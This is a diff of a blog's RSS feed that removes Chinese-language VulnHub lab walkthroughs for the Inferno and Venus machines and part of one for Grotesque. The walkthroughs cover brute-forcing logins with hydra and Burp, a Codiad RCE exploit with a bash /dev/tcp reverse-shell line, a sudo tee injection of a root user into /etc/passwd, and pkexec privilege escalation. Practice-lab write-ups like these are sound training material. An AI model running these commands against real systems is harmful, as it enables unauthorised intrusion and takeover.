- &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1066.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUv&#34;&gt;http://192.168.31.25/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1067.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;目录扫描 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.25/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1068.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现了一个敏感的地址，进入后需要发现认证:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUvaW5mZXJubw==&#34;&gt;http://192.168.31.25/inferno&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1069.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;也没有别的办法了，只能对这个页面进行爆破用户名和密码&lt;/p&gt;
-&lt;h3 id=&#34;hydra-爆破网站后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破网站后台&#34;&gt;#&lt;/a&gt; hydra 爆破网站后台&lt;/h3&gt;
-&lt;p&gt;利用 hydra 选取合适的用户名字典进行爆破&lt;br&gt;
- &lt;code&gt;hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.2 5 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1070.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这个爆破时间是比较长的，每一个用户名都要匹配几百万次，是非常慢的因为大部分网站的用户名都是 admin，此处我们直接用 admin 爆破，可以简化很多事情，但是每一次只能爆破 64 个，速度也是不容乐观的&lt;br&gt;
- &lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.31.221 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1071.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;等待大概两三个小时差不多就出结果了&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;凭借 admin:dante1 可进入网站第一层认证结束之后，还有第二层认证，但是好在第一层和第二层的用户名和密码是相同的输入 admin:dante1 后成功进入网站后台&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1072.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;文件上传尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传尝试&#34;&gt;#&lt;/a&gt; 文件上传尝试&lt;/h3&gt;
-&lt;p&gt;这是一些 php 的源码文件，代码审计后没有发现突破口&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1073.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;右键可以上传文件，可以上传一个 php 文件看看什么效果&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1074.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;上传 shell.php 文件用来反弹 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1075.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找了大半天根本找不到 shell.php 上传的位置，只能放弃这个方法&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1076.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;但是仔细观察的话，发现这个网站的 header 的部分，有一个 codiad，这是一个框架，可以去搜索这个框架自身有没有漏洞&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1077.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;codiad-rce漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#codiad-rce漏洞&#34;&gt;#&lt;/a&gt; codiad RCE 漏洞&lt;/h3&gt;
-&lt;p&gt;本地直接用 searchsploit 搜寻 codiad 发现了是存在 RCE 漏洞&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1078.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-x 确定 exp 的位置，将 exp 复制到自己的目录下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1079.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;直接用 py 运行此程序，看一下使用说明&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1080.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;依据使用说明，构造好命令&lt;br&gt;
- &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;/dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;quot;&#39; | nc -lnvp 4444&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;在 http: 后面加了 admin:dante1@是为了突破第一层的认证，因为进入该网站需要两次认证，认证了第一次之后才会进入到 codiad 页面，否则显示未授权&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1081.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;显示是失败的，不知道什么原因，但是在实际测试中，经常会碰到这样的情况，这时就需要在去寻找新的 payload 进行利用&lt;/p&gt;
-&lt;p&gt;找到了一个 RCE 漏洞的脚本: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvQ29kaWFkLVJlbW90ZS1Db2RlLUV4ZWN1dGUtRXhwbG9pdA==&#34;&gt;https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1082.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;python exploit.py http://192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1083.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;没有加第一层认证回显了未授权  &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/) admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1084.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在 4445 端口处接收到了反弹的 shell, 拿到了网站的 webshell, 依据下面三个命令输出为一个标准的 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1085.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;十六进制换算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#十六进制换算&#34;&gt;#&lt;/a&gt; 十六进制换算&lt;/h3&gt;
-&lt;p&gt;看了 /etc/passwd 发现我们需要先拿到 dante 用户的权限再去拿 root 权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1086.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;搜寻目录，在 dante 的 Downloads 文件下找到了一个.download.daty 隐藏文件，打开之后看到是一串 16 进制的数据，需要解密&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1087.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在 CyberChef 上进行解密，from Hex 得到了 dante 用户的密码 V1rg1l10h3lpm3&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1088.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在密码的最后有个小数点，并不知道这个小数点是否参与了密码，但是试两次就知道结果了 V1rg1l10h3lpm3. 或者 V1rg1l10h3lpm3&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1089.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;凭借第二个密码拿到了 dante 用户的 shell&lt;/p&gt;
-&lt;h3 id=&#34;term-设置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#term-设置&#34;&gt;#&lt;/a&gt; TERM 设置&lt;/h3&gt;
-&lt;p&gt;输入 clear 时显示 TERM 变量没有设置，我们只需要通过 export 命令将 TERM 改为 xterm 即可解决这个终端美化问题&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1090.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;tee权限错误写passwd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tee权限错误写passwd&#34;&gt;#&lt;/a&gt; tee 权限错误写 passwd&lt;/h3&gt;
-&lt;p&gt;sudo -l 看到直接调用 tee 命令写入文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1091.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在 gtfobins 上看到了使用 tee 提权的代码如下，先设置一个本地的文件，将自己的一些数据追加到本地的文件里边，基于此，构造一个 SHA512 的密码，直接往 /etc/passwd 里边添加一个 root 账户&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1092.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;利用 kali 机器生成一个 SHA512 的值，密码为 123456  &lt;code&gt;mkpasswd --method=SHA-512 --stdin&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1093.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在靶机上依次执行下列命令，报错先不管&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入新的享有root功能的用户&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt; 2 并验证是否写入成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LFILE=/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;test2:$6$/VIJFJppMzTLzIjH$fnPPrC8J2dR8Fei748mY5MNaETVedvIoFgAXA8c33GThHZ2Cy7cflwv9Eo5xZJGWLHir1J.jh3VnnaBMkP74/0:0:0:root:/root:/bin/bash&amp;#x27; | sudo tee -a &amp;quot;$LFILE&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;依据新建的用户进入其shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su test2 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1094.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 结果显示我们当前已经拿到了 root 账户&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/</guid>
-            <title>VULNHUB 37 VENUS</title>
-            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/</link>
-            <category>VULNHUB 31-40</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtdmVudXMsNzA1Lw==&#34;&gt;https://www.vulnhub.com/entry/the-planets-venus,705/&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 VENUS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-991.png&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.12 靶机开放端口 22,8080&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=&#34;&gt;http://192.168.31.12:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-992.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;给出了 guest:guest 的账户和密码，直接进入该网站&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-993.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看了一下，翻了翻源代码没有发现敏感信息&lt;/p&gt;
-&lt;p&gt;用 gobuster 进行爆破:&lt;br&gt;
- &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12:8080/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-994.png&#34;&gt;
-&lt;p&gt;-&amp;gt; 关键目录 /admin&lt;/p&gt;
-&lt;h3 id=&#34;存储-cookies-泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储-cookies-泄露&#34;&gt;#&lt;/a&gt; 存储 cookies 泄露&lt;/h3&gt;
-&lt;p&gt;进入 admin 页面，检查页面是否存储 cookies 信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-995.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 auth 认证信息解密出来后发现是 guest:thrfg&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-996.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;意味着我们登陆 guest 用户，页面就会存储 guest 用户的相关票据，但是凭借此用户密码是无法登陆到网站后台的&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-997.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;是不是有可能还有其他的登陆用户，我们将 google 存储在此页面的 cookie 信息清除&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-998.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;重新回到登陆页面&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-999.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 下一步的目标转化为爆破此页面的用户名和密码&lt;/p&gt;
-&lt;h3 id=&#34;burp-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-爆破登陆框&#34;&gt;#&lt;/a&gt; burp 爆破登陆框&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;但是如果没有什么规律的话， 1000 行大小的字典爆破，需要 1000*1000 次的爆破次数，因为用户名和密码都有可能是这 1000 个种的任意一个&lt;br&gt;
-输入一个错误的用户名看页面回显，看到了 Invalid username 的信息，于是乎我们可以先随便写一个密码，先爆破出用户名有哪些，有的话在依据此用户名爆破其密码&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1000.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;顺便测一下输入正确的用户名，错误的密码的时候，页面的回显结果。发现有 Invalid password 的字段，可以据此信息判断页面是否能登陆成功。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1001.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;现在我们就通过爆破用户名的方式进入该网站，可以通过 burp 和 hydra 进行爆破。采用 burp 的方式需要先将浏览器数据进行代理。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1002.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将用户名设置为变量，密码设置为固定值进行爆破，由于默认给出的账户名和密码都是 guest 是一样的，这里我就直接通过将 username 和 password 的字段设置为一致来爆破。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1003.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;选取合适的字典如下，开始爆破&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1004.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;爆破成功后得到了 venus 用户是该网站的用户。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1005.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;接下来应该将 venus 作为固定用户名，测试其密码为多少。&lt;/p&gt;
-&lt;h3 id=&#34;hydra-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破登陆框&#34;&gt;#&lt;/a&gt; hydra 爆破登陆框&lt;/h3&gt;
-&lt;p&gt;或者用 hydra 的方式爆破用户名和密码&lt;br&gt;
- &lt;code&gt;hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &amp;quot;/:username=^USER^&amp;amp;password^PASS^:Invalid username.&amp;quot;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1006.png&#34;&gt;
-&lt;p&gt;-&amp;gt; 测试得到了三个用户分别是 guest，venus，magellan&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;爆破用户名的阶段是比较漫长的，虽然可以用 hydra 的 - t 参数指定最大线程为 64 ，但是还是需要很长时间才能爆破出三个用户名的，这里为了尽快达到效果，我用了 vim 将字典进行了修改。&lt;br&gt;
-单单依据上面的思路继续下去，需要对三个用户分别进行爆破，guest 和 venus 比较好爆破，经过一段时间的爆破发现这两个用户名的密码就是其用户名。但如果这个密码是比较复杂的也是很难爆破出来的。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;数据包规律&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据包规律&#34;&gt;#&lt;/a&gt; 数据包规律&lt;/h3&gt;
-&lt;p&gt;登陆 guest:guest，拦截浏览器数据，发现页面自动存储了 cookie 的信息。解密之后为 guest:thrfg, 前者是用户名，后者并不是密码，但可能是密码的另一种加密方式。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1007.png&#34;&gt;
-&lt;p&gt;登陆 venus:venus，拦截浏览器数据，找到 cookie，解密后的凭据为 venus:irahf&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1008.png&#34;&gt;
-&lt;p&gt;我们继续清除浏览器存储的 cookie 信息，用正确的用户名和一个虚假的密码尝试登陆，并用 burp 做代理拦截流量，发现页面给我们回复了一个加密密文。解密后得到了 magellan:irahfvnatrbybtl1989&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1009.png&#34;&gt;
-&lt;p&gt;综上，我们得到了三组数据，分别是&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;guest:thrfg&lt;/code&gt;   &lt;code&gt;venus:irahf&lt;/code&gt;   &lt;code&gt;magellan:irahfvnatrbybtl1989&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;凯撒解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒解密&#34;&gt;#&lt;/a&gt; 凯撒解密&lt;/h3&gt;
-&lt;p&gt;观察得知，好像就是一个字符的偏移加密，这就是凯撒加密无疑了，但是具体偏移多少位还需要一一尝试，在下面网址中依次按不同的偏移量进行解密:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw&#34;&gt;http://moersima.00cha.net/kaisamima.asp&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1010.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;最终得到了加密方式为凯撒偏移 13 的加密，并且三位用户名密码均得到了。&lt;/p&gt;
-&lt;p&gt;ssh 成功拿到了 magellan 的权限，得到了其 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1011.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
-&lt;p&gt;看了一眼服务器存在 pkexec 的，并且有 s 权限，而且存在 gcc 编译器的，直接利用此进行提权&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1012.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 pkexec 的利用脚本发送至对方服务器，编译运行&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1013.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/140%20LOOZ/</guid>
             <title>VULNHUB 40 LOOZ</title>
             <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/140%20LOOZ/</link>
@@ -1051,137 +1182,6 @@ John 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/director
 &lt;p&gt;既然是可执行文件，就去执行&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1120.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; 拿到了 root 的 shell&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/</guid>
-            <title>VULNHUB 36 GROTESQUE1</title>
-            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/</link>
-            <category>VULNHUB 31-40</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTEwMSw2NTgv&#34;&gt;https://www.vulnhub.com/entry/grotesque-101,658/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BlcnBldHVhbF9CbHVlL2FydGljbGUvZGV0YWlscy8xMjQ1NDE4OTM=&#34;&gt;https://blog.csdn.net/Perpetual_Blue/article/details/124541893&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 GROTESQUE1：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-950.png&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.29、靶机开放端口 80&lt;/p&gt;
-&lt;p&gt;2 ）再次确认开放端口&lt;/p&gt;
-&lt;p&gt;识别到的 80 端口，没有其他的端口，感觉是有问题的，因为这种情况很少能侵入到系统，需要再次进行扫描判断结果是否正确&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-951.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 66,80&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjk=&#34;&gt;http://192.168.31.29&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-952.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.29&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-953.png&#34;&gt;
-&lt;p&gt;-&amp;gt; 80 端口可以放弃了，开始把目标放在 66 端口上&lt;/p&gt;
